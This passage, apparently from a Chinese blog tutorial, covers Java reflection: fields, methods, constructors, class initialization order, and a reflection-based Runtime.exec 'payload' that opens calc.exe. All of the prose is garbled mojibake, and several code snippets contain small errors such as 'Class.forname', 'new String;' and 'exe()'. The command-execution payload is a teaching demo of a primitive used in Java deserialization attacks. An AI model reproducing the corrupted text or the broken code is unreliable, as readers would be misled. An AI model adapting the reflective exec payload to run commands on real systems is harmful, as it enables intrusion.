class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151315.png" alt="QQæˆªå›¾20210219151315"></p><h1 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h1><h2 id="åå°„çš„åŸºç¡€"><a href="#åå°„çš„åŸºç¡€" class="headerlink" title="åå°„çš„åŸºç¡€"></a>åå°„çš„åŸºç¡€</h2><p>åå°„æ˜¯javaçš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äºè·å–ç±»çš„è¯¦ç»†ä¿¡æ¯ï¼ˆæ–¹æ³•ï¼Œå˜é‡ï¼‰ï¼Œå¹¶å¯ä»¥æ‰§è¡Œç±»ä¸­çš„æ–¹æ³•ã€‚</p><h3 id="è·å¾—ä¸€ä¸ªç±»çš„ç±»å¯¹è±¡"><a href="#è·å¾—ä¸€ä¸ªç±»çš„ç±»å¯¹è±¡" class="headerlink" title="è·å¾—ä¸€ä¸ªç±»çš„ç±»å¯¹è±¡"></a>è·å¾—ä¸€ä¸ªç±»çš„ç±»å¯¹è±¡</h3><p>è¦è·å–ç±»çš„è¯¦ç»†ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä¸­çš„æ–¹æ³•ï¼Œé¦–å…ˆè‚¯å®šæ˜¯è¦è·å–åˆ°é‚£ä¸ªç±»çš„ç±»å¯¹è±¡</p><p>æ–¹æ³•ä¸€:æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªClassç±»å‹çš„å˜é‡ï¼Œç”¨äºæ¥æ”¶Class.forname(â€œç±»â€)è¿”å›çš„ç±»å¯¹è±¡ã€‚è¿™ä¸ªæ–¹æ³•å¿…é¡»é€šè¿‡try..catch æ¥å¤„ç†å…¶ä¸­ClassNotFoundException</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">Class clazz &#x3D; Class.forname(&quot;java.lang.String&quot;)ï¼›&#125;</span><br><span class="line">catch(ClassNotFoundException e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒ:æˆ‘ä»¬å®ä¾‹åŒ–ä¸€ä¸ªç±»çš„å¯¹è±¡å‡ºæ¥ï¼Œç„¶åé€šè¿‡ å¯¹è±¡.getClass()è·å¾—å…¶ç±»å¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String a &#x3D; new String;</span><br><span class="line">Class clazz &#x3D; a.getclass();</span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä¸‰:ä½¿ç”¨.class</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; String.class;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±è·å¾—ä¸€ä¸ªæŒ‡å®šç±»çš„ç±»å¯¹è±¡äº†ã€‚å¾ˆç®€å•ã€‚æˆ‘ä»¬å¯ä»¥å¯¹ä¸€ä¸ªç±»å¯¹è±¡ä½¿ç”¨getName()æ–¹æ³•è·å–å…¶ç±»åã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System.out.println(clazz.getName());</span><br></pre></td></tr></table></figure><h3 id="è·å–ä¸€ä¸ªç±»å¯¹è±¡çš„æ‰€æœ‰æˆå‘˜"><a href="#è·å–ä¸€ä¸ªç±»å¯¹è±¡çš„æ‰€æœ‰æˆå‘˜" class="headerlink" title="è·å–ä¸€ä¸ªç±»å¯¹è±¡çš„æ‰€æœ‰æˆå‘˜"></a>è·å–ä¸€ä¸ªç±»å¯¹è±¡çš„æ‰€æœ‰æˆå‘˜</h3><h4 id="è·å–å±æ€§å¹¶ä¿®æ”¹"><a href="#è·å–å±æ€§å¹¶ä¿®æ”¹" class="headerlink" title="è·å–å±æ€§å¹¶ä¿®æ”¹"></a>è·å–å±æ€§å¹¶ä¿®æ”¹</h4><p>å¯¹ç±»å¯¹è±¡ä½¿ç”¨ getFields() æˆ– getDeclaredFields() æ–¹æ³•å³å¯è·å¾—å±æ€§æ•°ç»„ï¼ŒåŒºåˆ«åœ¨äºå‰è€…åªèƒ½è·å–å…¬æœ‰å±æ€§ï¼Œåè€…èƒ½è·å–ç§æœ‰å±æ€§ã€‚<br>ç„¶åéå†å±æ€§æ•°ç»„ï¼Œé€šè¿‡å¯¹æ¯ä¸€é¡¹æ‰§è¡ŒgetName()è·å–å±æ€§åï¼Œget(å®ä¾‹åŒ–çš„å¯¹è±¡)è·å¾—å±æ€§å€¼<br>ç„¶åå¯¹æŸä¸€é¡¹è¿›è¡Œ.set()å¯¹å…¶è¿›è¡Œä¿®æ”¹<br>è¿™é‡Œéœ€è¦æçš„æ˜¯ï¼Œå¦‚æœè¦è·å¾—æˆ–ä¿®æ”¹ç§æœ‰å±æ€§çš„å€¼çš„æ—¶å€™ï¼Œéœ€è¦å¯¹ç§æœ‰å±æ€§ä½¿ç”¨setAccessible(true)æ¥å®ç°ç§æœ‰è®¿é—®</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        abc test &#x3D; new abc();</span><br><span class="line">        Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">        for(Field Field:Fields)&#123; &#x2F;&#x2F;éå†Fieldsæ•°ç»„</span><br><span class="line">            try &#123; &#x2F;&#x2F;æ‰§è¡Œget()æ–¹æ³•æ—¶éœ€æŠ›å‡ºIllegalAccessExceptioné”™è¯¯</span><br><span class="line">                Field.setAccessible(true);  &#x2F;&#x2F;å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å®ç°ç§æœ‰è®¿é—®</span><br><span class="line">                System.out.print(Field.getName());</span><br><span class="line">                Object value &#x3D; Field.get(new abc());</span><br><span class="line">                System.out.println(&quot;:&quot; + value);</span><br><span class="line">                Field.set(test,&quot;new&quot;);   &#x2F;&#x2F;ä¿®æ”¹testå¯¹è±¡ä¸­çš„å˜é‡</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(test.a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public String a &#x3D;new String(&quot;tom and mary&quot;);</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151405.png" alt="QQæˆªå›¾20210219151405"></p><p>å¦å¤–ï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡getFiled(â€œå±æ€§åâ€)æ¥è·å–ç‰¹å®šå±æ€§çš„Filedå¯¹è±¡ï¼Œ getDeclaredFields() åŒç†</p><h4 id="è·å–æ–¹æ³•å¹¶æ‰§è¡Œ"><a href="#è·å–æ–¹æ³•å¹¶æ‰§è¡Œ" class="headerlink" title="è·å–æ–¹æ³•å¹¶æ‰§è¡Œ"></a>è·å–æ–¹æ³•å¹¶æ‰§è¡Œ</h4><p>æ¥ä¸‹æ¥æ˜¯è·å–æ–¹æ³•çš„ä¸€äº›ä¿¡æ¯<br>æˆ‘ä»¬é€šè¿‡getMethodè·å–æ–¹æ³•å¯¹è±¡ï¼Œç„¶åé€šè¿‡getNameè·å–æ–¹æ³•åï¼ŒgetReturnTypeè·å–è¿”å›å€¼ç±»å‹ï¼ŒgetParameterTypesè·å–ä¼ å…¥çš„å‚æ•°ç±»å‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        Method[] methods &#x3D; clazz.getDeclaredMethods();</span><br><span class="line">        for(Method method:methods)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                System.out.print(method.getName());</span><br><span class="line">                System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;);</span><br><span class="line">                Class[] ParameterTypes &#x3D; method.getParameterTypes();</span><br><span class="line">                for(Class ParameterType:ParameterTypes)&#123;</span><br><span class="line">                    System.out.print(&quot;ParamType:&quot;+ParameterType.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public int a &#x3D;1;</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line"></span><br><span class="line">    public void func1(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">    private void func2(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯å¯¹methodå¯¹è±¡æ‰§è¡Œinvokeæ–¹æ³•è°ƒç”¨ï¼Œé€šè¿‡ä¼ å…¥å‚æ•°ï¼ŒæŒ‡å®šå¯¹è±¡ï¼Œå³å¯è°ƒç”¨è¯¥æ–¹æ³•ã€‚æˆ‘åœ¨ä¸Šè¿°ä»£ç ä¸­æ·»åŠ äº†ä¿®æ”¹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        Method[] methods &#x3D; clazz.getDeclaredMethods();</span><br><span class="line">        for(Method method:methods)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                System.out.print(method.getName());</span><br><span class="line">                System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;);</span><br><span class="line">                Class[] ParameterTypes &#x3D; method.getParameterTypes();</span><br><span class="line">                for(Class ParameterType:ParameterTypes)&#123;</span><br><span class="line">                    System.out.print(&quot;ParamType:&quot;+ParameterType.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;&quot;);</span><br><span class="line">                method.setAccessible(true);  &#x2F;&#x2F;æ‰“å¼€ç§æœ‰è®¿é—®</span><br><span class="line">                method.invoke(new abc(),2);   &#x2F;&#x2F;new è¿™é‡Œinvokeç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šå®ä¾‹åŒ–å¯¹è±¡ï¼Œä¹‹åçš„å‚æ•°ä»£è¡¨ä¼ å…¥æ–¹æ³•çš„å‚æ•°</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public int a &#x3D;1;</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line"></span><br><span class="line">    public void func1(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">    private void func2(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–æ„é€ æ–¹æ³•å¹¶æ‰§è¡Œ"><a href="#è·å–æ„é€ æ–¹æ³•å¹¶æ‰§è¡Œ" class="headerlink" title="è·å–æ„é€ æ–¹æ³•å¹¶æ‰§è¡Œ"></a>è·å–æ„é€ æ–¹æ³•å¹¶æ‰§è¡Œ</h4><p>è·å¾—æ„é€ æ–¹æ³•ï¼Œä¸»è¦æ˜¯é€šè¿‡ getConstructors()å’ŒgetDeclaredConstructors() ï¼Œåè€…èƒ½è®¿é—®ç§æœ‰å¯¹è±¡,ä¸‹é¢æ˜¯ç”¨éå†æ³•è·å¾—æ‰€æœ‰æ„é€ å‡½æ•°ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line">        Constructor[] conArray &#x3D; clazz.getDeclaredConstructors();</span><br><span class="line">            for (Constructor a:conArray)&#123;</span><br><span class="line">                a.setAccessible(true);</span><br><span class="line">                System.out.println(a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public abc(String name,int age)&#123;</span><br><span class="line">        System.out.println(&quot;å§“åï¼š&quot;+name+&quot;å¹´é¾„ï¼š&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line">    private abc(int age)&#123;</span><br><span class="line">        System.out.println(&quot;ç§æœ‰çš„æ„é€ æ–¹æ³•   å¹´é¾„ï¼š&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://www.const27.com/wp-content/uploads/2020/12/image-53.png" alt="img"><br>è¿è¡Œç»“æœ</p><p>æˆ‘ä»¬åˆšæ‰æè¿‡,getFiled()é™„å¸¦å‚æ•°å¯ä»¥æŒ‡å®šè®¿é—®æŸä¸€ä¸ªå±æ€§ï¼ŒåŒç†ï¼ŒgetConstructorä¹Ÿä¸€æ ·ï¼Œæˆ‘ä»¬æƒ³è¦æ‰§è¡ŒæŸä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œå¾€å¾€è¿™ä¸ªæ–¹æ³•æ›´å®ç”¨<br>è¦æ‰§è¡Œä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿™ä¸ªè¿‡ç¨‹æˆ‘ä»¬ç”¨newInstance()æ–¹æ³•å®ç°</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line"></span><br><span class="line">        Constructor test &#x3D; clazz.getDeclaredConstructor(int.class);  &#x2F;&#x2F;æŒ‡å®šå‚æ•°ï¼Œå³å¯ä»å¤šä¸ªé‡è½½çš„æ„é€ å‡½æ•°æŒ‡å®šåˆ°æŸä¸ªå…·ä½“çš„æ„é€ å‡½æ•°</span><br><span class="line">        test.setAccessible(true);</span><br><span class="line">        test.newInstance(12);  &#x2F;&#x2F;ç§æœ‰æ„é€ æ–¹æ³•åªéœ€è°ƒç”¨ä¸€ä¸‹newInstanceä¼ å…¥å‚æ•°å³å¯</span><br><span class="line"></span><br><span class="line">        Constructor test2 &#x3D; clazz.getDeclaredConstructor(String.class,int.class);</span><br><span class="line">        test2.newInstance(&quot;tom&quot;,15);  &#x2F;&#x2F;å…¬æœ‰æ„é€ æ–¹æ³•ä¹Ÿä¸€æ ·</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public abc(String name,int age)&#123;</span><br><span class="line">        System.out.println(&quot;å§“åï¼š&quot;+name+&quot;å¹´é¾„ï¼š&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line">    private abc(int age)&#123;</span><br><span class="line">        System.out.println(&quot;ç§æœ‰çš„æ„é€ æ–¹æ³•   å¹´é¾„ï¼š&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151513.png" alt="QQæˆªå›¾20210219151513"></p><h2 id="åå°„çš„è¿›é˜¶ä¸å®‰å…¨"><a href="#åå°„çš„è¿›é˜¶ä¸å®‰å…¨" class="headerlink" title="åå°„çš„è¿›é˜¶ä¸å®‰å…¨"></a>åå°„çš„è¿›é˜¶ä¸å®‰å…¨</h2><h3 id="Class-forName-å®è´¨ä¸ç±»åˆå§‹åŒ–"><a href="#Class-forName-å®è´¨ä¸ç±»åˆå§‹åŒ–" class="headerlink" title="Class.forName å®è´¨ä¸ç±»åˆå§‹åŒ–"></a>Class.forName å®è´¨ä¸ç±»åˆå§‹åŒ–</h3><p>Class.forName(â€œâ€¦â€) å¸¸è¢«æˆ‘ä»¬æ‹¿æ¥è·å¾—ç±»å¯¹è±¡ï¼Œä½†æ˜¯å®é™…ä¸Šï¼ŒClass.fornameæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåªä¸è¿‡æˆ‘ä»¬é»˜è®¤è¾“ç¬¬ä¸€ä¸ªå‚æ•°ï¼šç±»åå°±èƒ½å®Œæˆå·¥ä½œäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¿™æ˜¯Class.fornNameå‡½æ•°åŸå‹</span><br><span class="line">public static Class&lt;?&gt; forName(String name, boolean initialize,</span><br><span class="line">                                   ClassLoader loader)</span><br><span class="line"></span><br><span class="line">Class.forName(className)</span><br><span class="line">&#x2F;&#x2F; ç­‰äº</span><br><span class="line">Class.forName(className, true, currentLoader)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çœ‹è§æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŒ‡å®šç±»åå°±ä¸å¤šè®²äº†ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†³å®šç±»æ˜¯å¦åˆå§‹åŒ–ï¼ˆè¿™ä¸ªç¨åä¼šè¯¦ç»†é˜æ˜ï¼‰ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ClassLoaderç±»åŠ è½½å™¨ï¼ˆå‘Šè¯‰JVMå¦‚ä½•åŠ è½½è¿™ä¸ªç±»è¿™é‡Œä¸å±•å¼€è¯´ï¼‰</p><p>å…³äºä¸€ä¸ªç±»çš„åˆå§‹åŒ–ï¼Œæœ‰ä¸‰ç§æ“ä½œå¯ä»¥å®ç°:æ„é€ æ–¹æ³•ï¼Œç©ºå—å’Œstaticå—ï¼Œå°±åƒè¿™æ ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class TrainPrint &#123;</span><br><span class="line"> &#123;</span><br><span class="line"> System.out.printf(&quot;Empty block initial %s\n&quot;, this.getClass());</span><br><span class="line"> &#125;</span><br><span class="line"> static &#123;</span><br><span class="line"> System.out.printf(&quot;Static initial %s\n&quot;, TrainPrint.class);</span><br><span class="line"> &#125;</span><br><span class="line"> public TrainPrint() &#123;</span><br><span class="line"> System.out.printf(&quot;Initial %s\n&quot;, this.getClass());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ‰§è¡Œé¡ºåºæ˜¯å¦‚ä½•å‘¢ï¼Œåœ¨å¼•å…¥çˆ¶ç±»çš„æƒ…å†µä¸‹åˆæ˜¯å¦‚ä½•å‘¢ï¼Ÿæˆ‘ä»¬å†™ä¸ªdemoçœ‹çœ‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        abc a &#x3D; new abc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class b&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;bç©ºå—å·²æ‰§è¡Œ&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot; b staticå—å·²æ‰§è¡Œ&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public b()&#123;</span><br><span class="line">        System.out.println(&quot;bç±»æ„é€ æ–¹æ³•å·²æ‰§è¡Œ&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class abc extends b&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;aç©ºå—å·²æ‰§è¡Œ&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot; a staticå—å·²æ‰§è¡Œ&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public abc() &#123;</span><br><span class="line">        System.out.println(&quot;aåˆå§‹åŒ–æ–¹æ³•å·²æ‰§è¡Œ&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151831.png" alt="QQæˆªå›¾20210219151831"></p><p>æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°æ‰§è¡Œé¡ºåºï¼Œå¯¹ç»§æ‰¿ç±»æ¥è¯´ï¼Œ<br>1.ä¼šå…ˆæ‰§è¡Œçˆ¶ç±»staticå—<br>2.æ‰§è¡Œè‡ªå·±çš„staticå—<br>3.æ‰§è¡Œçˆ¶ç±»ç©ºå¿«<br>4.æ‰§è¡Œçˆ¶ç±»æ„é€ æ–¹æ³•<br>5.æ‰§è¡Œè‡ªå·±ç©ºå¿«<br>6.æ‰§è¡Œè‡ªå·±æ„é€ æ–¹æ³•</p><p>å¯¹äºä¸€ä¸ªç±»æ¥è¯´ï¼Œæ‰§è¡Œé¡ºåºåˆ™æ˜¯<br>1.æ‰§è¡Œstaticå—<br>2.æ‰§è¡Œç©ºå¿«<br>3.æ‰§è¡Œæ„é€ æ–¹æ³•</p><p>é‚£ä¹ˆå¯¹äºClass.forNameæŒ‡å®šçš„æ˜¯å¦è¿›è¡Œç±»åˆå§‹åŒ–å‚æ•°ï¼ŒæŒ‡çš„æ˜¯å“ªä¸ªéƒ¨åˆ†ï¼Ÿstaticå—ï¼Œç©ºå—è¿˜æ˜¯æ„é€ æ–¹æ³•?ç­”æ¡ˆæ˜¯åªä¼šæ‰§è¡Œstaticå—é‡Œçš„ï¼Œä¸”ä¼šä¼˜å…ˆæ‰§è¡Œçˆ¶ç±»çš„staticå—ã€‚<br>æˆ‘ä»¬æŠŠä¸Šé¢ä»£ç ä¸­çš„ä¸»å‡½æ•°æ›¿æ¢ä¸º</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸€ä¸‹ï¼Œçœ‹ç»“æœã€‚å‘ç°åªæ‰§è¡Œäº†staticå—</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151840.png" alt="QQæˆªå›¾20210219151840"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒClass.forName()ä¼šé»˜è®¤æ‰§è¡Œç±»çš„staticä»£ç å—ï¼Œæ˜¯ä¸ªæ¯”è¾ƒå±é™©çš„ä¿¡å·ã€‚<br>å¦å¤–ä¸€æï¼Œxxx.class.newinstance() ä¼šè‡ªåŠ¨è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•ã€‚</p><h3 id="Runtimeæ‰§è¡Œå‘½ä»¤è§£æ"><a href="#Runtimeæ‰§è¡Œå‘½ä»¤è§£æ" class="headerlink" title="Runtimeæ‰§è¡Œå‘½ä»¤è§£æ"></a>Runtimeæ‰§è¡Œå‘½ä»¤è§£æ</h3><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬è°ƒç”¨Runtimeç±»æ¥æ‰§è¡Œå‘½ä»¤æ—¶çš„æŒ‡å®šæ˜¯è¿™æ ·çš„</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exe()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ°æºç é‡Œåˆ†æè¿™æ®µä»£ç </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151850.png" alt="QQæˆªå›¾20210219151850"></p><p>å¯è§ï¼Œå½“æˆ‘ä»¬å¯¹Runtimeç±»æ‰§è¡ŒgetRuntime()æ—¶ä¼šå¾—åˆ°ä¸€ä¸ªRuntimeå¯¹è±¡ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬çš„execæ–¹æ³•äº†<br>åŒæ—¶ï¼ŒRuntime() è¢«privateä¿®é¥°ç¬¦ä¿®é¥°äº†ï¼Œè¿™è¯´æ˜æˆ‘ä»¬æ— æ³•é€šè¿‡Runtime a = new Runtime()æ¥å®ç°ä¸€ä¸ªRuntimeçš„å¯¹è±¡ã€‚<br>æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬æ­£å¸¸åœ°ä½¿ç”¨runtimeæ¥æ‰§è¡Œå‘½ä»¤åªèƒ½ä¾é ä»¥ä¸Šä»£ç ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è¦æ˜¯æƒ³è¦ä¾é åå°„æ¥å†™ä¸€ä¸ªRuntimeæ‰§è¡Œä»»æ„å‘½ä»¤çš„payloadï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•å†™å‘¢ï¼Ÿ</p><p>å…ˆæ¥ä¸€ä¸ªé”™è¯¯ç¤ºèŒƒï¼Œå½“æˆ‘ä»¬ç”¨å¸¸è§„çš„æ€è·¯å»å®ç°æ—¶ã€‚æˆ‘ä»¬ç›´æ¥è°ƒç”¨Runtimeç±»é‡Œçš„execæ–¹æ³•ï¼Œç„¶åé€šè¿‡newInstanceæ¥å®ä¾‹åŒ–ä¸€ä¸ªRuntimeå¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method method &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">method.setAccessible(true);</span><br><span class="line">method.invoke(clazz.newInstance(),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç»“æœåˆ™æ˜¯æŠ¥é”™ï¼šclass test cannot access a member of class java.lang.Runtime (in module java.base) with modifiers â€œprivateâ€<br>çœ‹æ¥é€šè¿‡åå°„ä¹Ÿä¸èƒ½ç›´æ¥è°ƒç”¨execæ–¹æ³•ï¼Œæˆ–è€…è¯´ä¸èƒ½å®ä¾‹åŒ–Runtimeå¯¹è±¡ã€‚<br>é‚£ä¹ˆæ­£ç¡®æ€è·¯è¯¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿåº”è¯¥æ˜¯å…ˆè°ƒç”¨getRuntimeè·å¾—Runtimeå¯¹è±¡ï¼Œç„¶åå†è°ƒç”¨execæ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method MgetRuntime &#x3D; clazz.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Object runtime &#x3D; MgetRuntime.invoke(clazz);  &#x2F;&#x2F;å¯¹ç±»å¯¹è±¡ä½¿ç”¨getRuntime(),å…¶å®å°±ç›¸å½“äºRuntime.getRuntime()ã€‚è¿™ç§æ–¹å¼ä»…é™staticæ–¹æ³•</span><br><span class="line">Method Mexec &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Mexec.invoke(runtime,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h3 id="ProcessBuilderæ‰§è¡Œå‘½ä»¤çš„åå°„å®ç°"><a href="#ProcessBuilderæ‰§è¡Œå‘½ä»¤çš„åå°„å®ç°" class="headerlink" 